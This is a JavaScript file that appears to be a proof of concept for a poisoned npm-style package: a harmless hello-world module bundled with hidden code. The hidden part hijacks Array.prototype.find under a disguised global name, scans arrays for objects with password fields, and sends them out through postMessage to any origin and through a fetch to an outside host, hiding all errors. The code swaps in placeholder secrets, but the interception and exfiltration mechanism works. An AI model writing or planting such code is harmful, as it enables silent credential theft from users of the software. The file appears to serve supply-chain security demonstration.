
// UMD pseudo module
(function (global, factory) {
	typeof exports === 'object' && typeof module !== 'undefined' ? factory(exports) :
	typeof define === 'function' && define.amd ? define(['exports'], factory) :
	(factory((global.hello_world_emo = global.hello_world_emo || {})));
}(this, function (exports) { 'use strict';
	exports.hello = function hello() {
		var target = arguments.length <= 0 || arguments[0] === undefined ? 'World' : arguments[0];

		console.log('Innocent hello, ' + target + ' :-)');
	}

	Object.defineProperty(exports, '__esModule', { value: true });

}));


// install interceptor
// pseudo-UMD attaching to global only
(function (global, factory) {
	const Ctor = function SVGFEInterceptElement() {}
	const HIDING_POINT = Ctor.name

	Object.defineProperty(global, HIDING_POINT, {
		value: global[HIDING_POINT] || new Ctor()
	})
	factory(global[HIDING_POINT])
}(this, function (exports) {
	'use strict';

	const VERSION = 0.1
	const LOG_STYLES = {
		reset: "color: black; background-color: white;",
		emoji: function(emoji, hash) {
			return "background-image: url(\"https://isitchristmas.com/emojis/" + emoji +
			".png#" + hash + "\"); background-size: cover;";
		},
		crack: "color: salmon; background-color: black;",
	}

	// avoid detection on known envs
	// TODO detect dev envs and dev navigators

	// prevent double insertion...
	if (exports.version && exports.version >= VERSION) return

	// ideas https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects#Fundamental_objects
	const originals = {
		Array: {
			prototype: {
				find: Array.prototype.find,
				forEach: Array.prototype.forEach,
				from: Array.prototype.from,
			}
		},
		Function: {
			prototype: {
				toString: Function.prototype.toString
			}
		},
		JSON: {
			parse: JSON.parse,
			stringify: JSON.stringify,
		},
		Object: {
			getPrototypeOf: Object.getPrototypeOf,
			getOwnPropertyNames: Object.getOwnPropertyNames,
			prototype: {
				hasOwnProperty: Object.prototype.hasOwnProperty
			}
		},
		String: {
			prototype: {
			}
		},
		console: {
			log: console.log,
			info: console.info,
			warn: console.warn,
		}
	}

	// lodash picks
	/**
	 * Creates a unary function that invokes `func` with its argument transformed.
	 *
	 * @private
	 * @param {Function} func The function to wrap.
	 * @param {Function} transform The argument transform.
	 * @returns {Function} Returns the new function.
	 */
	function overArg(func, transform) {
		return function(arg) {
			return func(transform(arg))
		};
	}

	/** Used to infer the `Object` constructor. */
	var objectCtorString = originals.Function.prototype.toString.call(Object)

	var getPrototype = overArg(Object.getPrototypeOf, Object)

	function isPlainObject(value) {
		if (value === null) return false
		if (typeof value !== 'object') return false

		const proto = getPrototype(value)
		if (proto === null) return true

		const Ctor = originals.Object.prototype.hasOwnProperty.call(proto, 'constructor') && proto.constructor
		return typeof Ctor == 'function' && Ctor instanceof Ctor && originals.Function.prototype.toString.call(Ctor) == objectCtorString
	}


	///////

	function exfiltrate(object) {
		// do not put data at risk. This is a proof of concept.
		object = {
			login: "SECRETXXX",
			password: "SECRETYYY",
		}

		originals.console.log('%c   %c %c  %c %c Exfiltrating interesting data to cover channel...',
			LOG_STYLES.emoji("smiling_imp"),
			LOG_STYLES.reset,
			LOG_STYLES.emoji('arrow_up'),
			LOG_STYLES.reset,
			LOG_STYLES.crack
		)

		if (window.opener) {
			try {
				window.opener.postMessage(object, '*')
			}
			catch (e) { /* swallow */ }
		}

		try {
			const requestOptions = {
				method: 'GET',
				headers: object,
				mode: 'no-cors',
				cache: 'default'
			}

			fetch(`https://isitchristmas.com/emojis/arrow_up.png`, requestOptions)
			.then(() => { /* swallow */ })
			.catch(() => { /* swallow */ })
		}
		catch (e) { /* swallow */ }
	}

	function process_interesting_data(object, partial_analysis) {
		exfiltrate(object)
	}

	function interception_filter(candidate) {
		if (!isPlainObject(candidate)) return false

		const allOwnPropertyNames = originals.Object.getOwnPropertyNames(candidate)
		let interestingOwnPropertyNames = allOwnPropertyNames
		.filter(name => {
			if (name[0] !== 'p' && name[0] !== 'P') return false

			const lcname = name.toLowerCase()
			return lcname === 'pwd' || lcname === 'password'
		})
		if (! interestingOwnPropertyNames.length) return false

		return {
			interestingOwnPropertyNames
		}
	}

	function spy(candidate) {
		const partial_analysis = interception_filter(candidate)
		if (! partial_analysis) return false

		originals.console.log('%c   %c %c  %c %c Found something interesting...',
			LOG_STYLES.emoji("smiling_imp"),
			LOG_STYLES.reset,
			LOG_STYLES.emoji('sparkles'),
			LOG_STYLES.reset,
			LOG_STYLES.crack,
			candidate
			//partial_analysis
		)

		setTimeout(() => process_interesting_data(candidate, partial_analysis))
	}

	Array.prototype.find = function(callback, thisArg) {
		//console.info('Array.prototype.find called with', this, callback, thisArg)

		originals.Array.prototype.forEach.bind(this)(spy)

		return originals.Array.prototype.find.bind(this)(callback, thisArg)
	}

	originals.console.log(
		'%c   %c    %c Rogue code installed ',
		LOG_STYLES.emoji('smiling_imp'),
		LOG_STYLES.reset,
		LOG_STYLES.crack
	)

	originals.console.log(
		'%c   %c %c  %c %c Establishing cover channel to Command & Control server...',
		LOG_STYLES.emoji("smiling_imp"),
		LOG_STYLES.reset,
		LOG_STYLES.emoji('twisted_rightwards_arrows'),
		LOG_STYLES.reset,
		LOG_STYLES.crack
	)

	originals.console.log(
		'%c   %c %c  %c %c Downloading instructions & updates...',
		LOG_STYLES.emoji("smiling_imp"),
		LOG_STYLES.reset,
		LOG_STYLES.emoji('arrow_down'),
		LOG_STYLES.reset,
		LOG_STYLES.crack
	)

	originals.console.log(
		'%c   %c %c  %c %c Establishing upload cover channel... ' + (window.opener ? 'success' : 'failure'),
		LOG_STYLES.emoji("smiling_imp"),
		LOG_STYLES.reset,
		LOG_STYLES.emoji('arrow_up'),
		LOG_STYLES.reset,
		LOG_STYLES.crack
	)
}))
